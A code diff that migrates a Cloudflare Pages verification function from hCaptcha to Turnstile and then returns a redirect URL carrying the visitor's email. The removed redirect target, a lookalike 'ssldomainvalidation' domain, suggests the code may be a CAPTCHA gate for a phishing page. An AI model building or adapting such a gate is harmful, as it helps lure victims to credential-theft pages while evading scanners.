@@ -1,27 +1,25 @@
+// functions/verify.js
 export async function onRequestPost(context) {
-  const formData = await context.request.formData();
-  const token = formData.get("h-captcha-response");
-  const email = formData.get("email") || "unknown";
+  const { token, email } = await context.request.json();
+  const secret = context.env.TURNSTILE_SECRET_KEY;
 
-  if (!token) {
-    return new Response("Missing hCaptcha token", { status: 400 });
-  }
+  const formData = new URLSearchParams();
+  formData.append("secret", secret);
+  formData.append("response", token);
+  formData.append("remoteip", context.request.headers.get("CF-Connecting-IP") || "");
 
-  const secret = context.env.HCAPTCHA_SECRET_KEY;
-
-  const response = await fetch("https://hcaptcha.com/siteverify", {
+  const result = await fetch("https://challenges.cloudflare.com/turnstile/v0/siteverify", {
     method: "POST",
-    headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    body: `response=${token}&secret=${secret}`
+    body: formData
   });
 
-  const result = await response.json();
+  const outcome = await result.json();
 
-  if (!result.success) {
-    return new Response("CAPTCHA failed", { status: 403 });
+  if (!outcome.success) {
+    return new Response("Turnstile verification failed", { status: 403 });
   }
 
-  const redirectUrl = `https://ssldomainvalidation.pages.dev?email=${encodeURIComponent(email)}`;
+  const redirectUrl = `https://yourfinalurl.com?email=${encodeURIComponent(email)}`;
   return new Response(JSON.stringify({ redirectUrl }), {
     headers: { "Content-Type": "application/json" },
     status: 200,
